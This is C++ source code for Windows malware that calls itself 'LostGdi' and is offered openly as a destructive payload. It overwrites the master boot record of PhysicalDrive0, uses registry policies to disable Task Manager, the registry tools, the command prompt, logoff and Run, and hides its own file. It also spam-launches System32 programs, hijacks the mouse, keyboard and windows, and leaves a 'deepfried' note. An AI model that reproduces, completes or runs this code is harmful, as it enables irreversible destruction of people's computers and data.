#include <Windows.h>
#include <tChar.h>
#define hkcu HKEY_CURRENT_USER
#define rdw REG_DWORD
#include "mbrbin.hpp"
/* windows.h gives us access to the WinMM API and the winuser API.
i am using the WinMM API to play sounds, and the winuser API to spam programs. */

typedef const char *PCCHAR;
typedef const wchar_t *PCWCHAR;

PCCHAR sounds[] = {"SystemHand", "SystemAsterisk", "SystemDefault", "SystemExclamation"};
int iSoundCount = rand() % 4;


namespace Keyboard {
	void SendKeyboardInput(WORD wKey, INPUT input) {
    	ZeroMemory(&input, sizeof(INPUT));
    	input.type = INPUT_KEYBOARD;
    	input.ki.wVk = wKey;
    	SendInput(1, &input, sizeof(INPUT));
    	return;
	}
	
	WORD caps = VK_CAPITAL, scrl = VK_SCROLL;
}

PCCHAR keys[] = {"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"};
int scankeys = sizeof(keys) / sizeof(PVOID);

PCWCHAR GetDirectory() {
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, MAX_PATH);
	return (CONST wchar_t*)path;
}

namespace Files {
	void HideMalwareFile() {
		SetFileAttributesW(GetDirectory(), FILE_ATTRIBUTE_HIDDEN);
	}
	
	DWORD CALLBACK Spammer(LPVOID pvoid) {
		WIN32_FIND_DATAA wfd;
		PCCHAR dirc = "C:\\WINDOWS\\system32\\*.exe";
		while (true) {
			HANDLE hFnd = FindFirstFileA(dirc, &wfd);
			ShellExecuteA(NULL, "open", wfd.cFileName, NULL, NULL, SW_SHOWDEFAULT);
			while (FindNextFileA(hFnd, &wfd)) {
				ShellExecuteA(NULL, "open", wfd.cFileName, NULL, NULL, SW_SHOWDEFAULT);
				Sleep(rand() % 500);
			}
		}
	}
}


namespace Movement {
	DWORD CALLBACK SetRandCursorPos(LPVOID pvoid) {
		int w, h;
		while (true) {
			w = GetSystemMetrics(0), h = GetSystemMetrics(1);
			SetCursorPos(rand() %  w, rand() % h);
		}
	}
	
	DWORD WINAPI SetBounceWndPos(LPVOID pvoid) {
		HWND hwnd;
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		hwnd = GetForegroundWindow();
		x += incrementation * sx;
		y += incrementation * sy;
		SetWindowPos(hwnd, NULL, x, y, x, y, 0);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		Sleep(10);
	}
}
}

namespace Inputs {
	DWORD CALLBACK InputKeyboard(LPVOID pvoid) {
		while (true) {
			INPUT input;
			Keyboard::SendKeyboardInput(Keyboard::caps, input);
			Sleep(500);
			Keyboard::SendKeyboardInput(Keyboard::scrl, input);
			Sleep(500);
//			Sleep(500);
			Keyboard::SendKeyboardInput(VkKeyScanA(rand() % scankeys), input);
			Sleep(500);
		}
	}
}

namespace Registry {
	VOID AddKey(HKEY hk, LPCWSTR lpsub, LPCWSTR lpval, DWORD dwtype, UINT val) {
		HKEY hky;
		DWORD dwd;
		long res;
		
		res = RegCreateKeyExW(hk, lpsub, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hk, &dwd);
		res = RegSetValueExW(hk, lpval, 0, dwtype, (const BYTE*)&val, (int)sizeof(val));
		
		RegCloseKey(hky);
		return;
	}
	
	PCWCHAR regPathSystem = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM";
	PCWCHAR regPathExplorer = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\EXPLORER";
	PCWCHAR regPathCmd = L"SOFTWARE\\Policies\\Microsoft\\Windows\\SYSTEM";
}

namespace Destroy {
	void SystemDisabler() {
		Registry::AddKey(hkcu, Registry::regPathSystem, L"DisableTaskmgr", rdw, 1);
		Registry::AddKey(hkcu, Registry::regPathSystem, L"DisableRegistryTools", rdw, 1);
		Registry::AddKey(hkcu, Registry::regPathCmd, L"DisableCmd", rdw, 2);
		Registry::AddKey(hkcu, Registry::regPathExplorer, L"NoLogoff", rdw, 1);
		Registry::AddKey(hkcu, Registry::regPathExplorer, L"NoRun", rdw, 1);
	}
	
	void KillMBR() {
		DWORD dwbytes;
		HANDLE hSctr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hSctr == INVALID_HANDLE_VALUE) {
			MessageBoxW(NULL, L"i could not open your hard drive", L"error?", MB_OK);
			CloseHandle(hSctr);
			ShellExecuteA(NULL, "open", "taskkill", "/f /im explorer.exe", NULL, SW_HIDE);
			exit(0);
		}
		if (!WriteFile(hSctr, mbrdata, 32768, &dwbytes, NULL)) {
			MessageBoxW(NULL, L"i could not write your bootsector", L"what?", MB_OK);
			CloseHandle(hSctr);
			ShowWindow(FindWindowA("Shell_TrayWnd", NULL), SW_MAXIMIZE);
			exit(0);
		}
		
	}
	
}

namespace exec {
	void pxc(LPCSTR path) {
		ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOWDEFAULT);
	} 
}

namespace Sounds {
	DWORD WINAPI PlayRndSounds(LPVOID pvoid) {
		while (true) {
			PlaySoundA(sounds[iSoundCount], NULL, SND_ALIAS);
		}
	}
}

namespace Notepad {
	void CreateDestructionNote() {
		DWORD dwnote;
		PCCHAR note = "Your PC has been deepfried by LostGdi";
		CreateDirectoryA("C:\\topkekfileslegit", NULL);
		HANDLE hNtpd = CreateFileA("C:\\topkekfileslegit\\shsjjaajsko.txt", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
		WriteFile(hNtpd, note, lstrlenA(note), &dwnote, NULL);
		ShellExecuteA(NULL, "open", "C:\\topkekfileslegit\\shsjjaajsko.txt", NULL, NULL, SW_SHOW);
	}
}

void StartPayload(DWORD dwpayload) {
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dwpayload, NULL, 0, 0);
}

void DestroyPayload(HANDLE hPld) {
	TerminateThread(hPld, 0);
	CloseHandle(hPld);
}
